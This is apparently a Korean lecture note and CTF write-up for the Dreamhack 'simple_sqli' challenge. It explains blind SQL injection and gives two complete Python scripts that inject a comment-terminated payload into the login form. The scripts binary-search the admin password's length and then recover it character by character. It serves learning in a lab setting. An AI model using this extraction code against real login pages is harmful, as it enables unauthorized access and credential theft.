## 들어가며
이번 강의에서도 simple_sqli 문제를 대상으로 하며, 이번에는 Blind SQL Injection을 통해 관리자의 비밀번호를 알아내 **로그인 과정을 우회하지 않고** 관리자 계정으로 로그인한다. 

---
## 웹 서비스 분석
자세한 설명은 이미 저번 강의인 [[Exercise - SQL Injection]] 강의에서 다뤘으니, 혹시라도 복습하면서 궁금한 것이 있다면 저번 강의를 참고하자. 

~~복습하며 궁금할 게 있을지는 모르겠지만..?~~

----
## 익스플로잇
비밀번호는 SQLite의 `users` 테이블에 있기 때문에, 이 테이블의 값을 하나씩 읽어오는 Blind SQL Injection을 수행하는 코드를 작성해야 한다. 지난 강의인 [[ServerSide - SQL Injection]] 강의에서도 다뤘듯, Blind SQL Injection은 여러 번의 질의로 정답을 찾아내는 스무고개와 비슷하다. 

비밀번호를 구성할 수 있는 문자 = 아스키 코드 문자라고 가정했을 때, 한 자리에 들어갈 수 있는 문자의 수는 0x20부터 0x7E까지 총 94개이며, 비밀번호가 10자리만 되어도 가능한 경우의 수는 $94^{10} \simeq 5 \times 10^{19}$개에 이를 만큼 매우 다양하다.

![[Pasted image 20260218205604.png|500]]

이는 다행히도 쿼리를 잘 사용하면 각각의 자리를 따로 조사할 수 있기 때문에, 실제로 전송해야 할 쿼리의 수는 $94 \times 10 = 940$개로 줄어들고 Binary Search 알고리즘을 사용하면 $\log_{2}{94} \times 10 \simeq 65$개로 더 줄어든다. 아까 전보다는 더 적어보일 수 있지만, 여전히 직접 시도하기에는 많기 때문에, 자동화 스크립트를 작성해 실행하는 게 바람직하다. 

**로그인 요청 구조 파악**
쿼리를 자동화하려면, 로그인할 때 전송하는 POST 데이터의 구조를 파악해야 한다. 이를 위해 Chrome의 개발자 도구를 사용한다. 

1. 개발자 도구의 네트워크 탭을 열고, Preserve log 클릭 (로그 보존 기능)
2. userid, userpassword에 guest 넣고 login 버튼 클릭 (로그인을 통한 네트워크 기록 생성)
3. 메시지 목록에서 `/login`으로 전송된 POST 요청 찾기 (네트워크 탭에서 HTTP 기록 확인)
4. 하단의 Form Data 확인

이를 확인하면, 로그인 때 입력한 ID와 PW는 각각 `userid`, `userpassword`로 전송된다.

---
### 비밀번호 길이 파악
비밀번호를 알아내기 위해, 먼저 비밀번호의 길이를 알아내야 한다. 

```python
import requests
import sys
from urllib.parse import urljoin


class Solver:
	"""Solver for simple_SQLi challenge"""
	
	# initialization
	def __init__(self, port:str) -> None:
		self._chall_url = f"http://host1.dreamhack.games:{port}"
		self._login_url = urljoin(self._chall_url, "login")
		
	# base HTTP methods
	def _login(self, userid:str, userpassword:str) -> bool:
		login_data = {
			"userid": userid,
			"userpassword": userpassword
		}
		resp = requests.post(self._login_url, data=login_data)
		return resp
	
	# base sqli methods
	def _sqli(self, query:str) -> requests.Response:
		resp = self._login(f"\" or {query}-- ", "hi")
		return resp
		
	def _sqli_lt_binsearch(self, query_tmpl:str, low:int, high:int) -> int:
		while 1:
			mid = (low + high) // 2
			if low + 1 >= high:
				break
			query = query_tmpl.format(val=mid)
			if "hello" in self._sqli(query).text:
				high = mid
			else:
				low = mid
		return mid
		
	# attack methods
	def _find_password_length(self, user:str, max_pw_len:int=100) -> int:
		query_tmpl = f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\")<{{val}})"
		pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)
		return pw_len
		
	def solve(self):
		pw_len = self._find_password_length("admin")
		print(f"Length of admin password is: {pw_len}")


if __name__ == '__main__':
	port = sys.argv[1]
	solver = Solver(port)
	solver.solve()
```

해당 코드를 WSL에서 실행할 때는 `$ ./ex.py (포트 번호)`로 실행하면 된다. 

---
### 비밀번호 획득
이제 비밀번호의 길이도 알았으니, 본격적으로 한 글자씩 비밀번호를 알아내는 코드를 작성한다. 해당 익스플로잇 코드는 위에서 작성한 코드를 조금만 고치면 된다. 
	
```python
import requests
import sys
from urllib.parse import urljoin


class Solver:
	"""Solver for simple_SQLi challenge"""
	
	# initialization
	def __init__(self, port:str) -> None:
		self._chall_url = f"http://host1.dreamhack.games:{port}"
		self._login_url = urljoin(self._chall_url, "login")
		
	# base HTTP methods
	def _login(self, userid:str, userpassword:str) -> requests.Response:
		login_data = {"userid": userid, "userpassword": userpassword}
		resp = requests.post(self._login_url, data=login_data)
		return resp
	
	# base sqli methods
	def _sqli(self, query:str) -> requests.Response:
		resp = self._login(f'" or {query}-- ', "hi")
		return resp
		
	def _sqli_lt_binsearch(self, query_tmpl:str, low:int, high:int) -> int:
		while 1:
			mid = (low + high) // 2
			if low + 1 >= high:
				break
			query = query_tmpl.format(val=mid)
			if "hello" in self._sqli(query).text:
				high = mid
			else:
				low = mid
		return mid
		
	# attack methods
	def _find_password_length(self, user:str, max_pw_len:int=100) -> int:
		query_tmpl = f"((SELECT LENGTH(userpassword) WHERE userid=\"{user}\")<{{val}})"
		pw_len = self._sqli_lt_binsearch(query_tmpl, 0, max_pw_len)
		return pw_len
		
	def _find_password(self, user:str, pw_len = int) -> str:
		pw = ''
		for idx in range(1, pw_len + 1):
			query_tmpl = f'((SELECT substr(userpassword, {idx}, 1) WHERE userid="{user}") < CHAR({{val}}))'
			pw += chr(self._sqli_lt_binsearch(query_tmpl, 0x20, 0x7E))
			print(f"{idx}. {pw}")
		return pw
		
	def solve(self):
		pw_len = self._find_password_length("admin")
		print(f"Length of admin password is: {pw_len}")
		print('Finding password:')
		pw = self._find_password('admin', pw_len)
		print(f'Password of the admin is: {pw}')


if __name__ == '__main__':
	port = sys.argv[1]
	solver = Solver(port)
	solver.solve()
```

---
## 마치며
이번 강의에서는 Blind SQL Injection으로 `admin` 계정의 비밀번호를 획득하는 실습을 진행했다. 이 공격 기법을 이용하면 계정 정보 외에도 데이터베이스에 존재하는 다른 정보들도 획득할 수 있으며, Blind SQL Injection 외에도 SQL Injection을 활용하는 다양한 기법들이 존재하니, 나중에 새로운 방법을 잘 이해하려면 지금까지 배운 내용들을 다시 복습하는 과정이 필수적이다. 
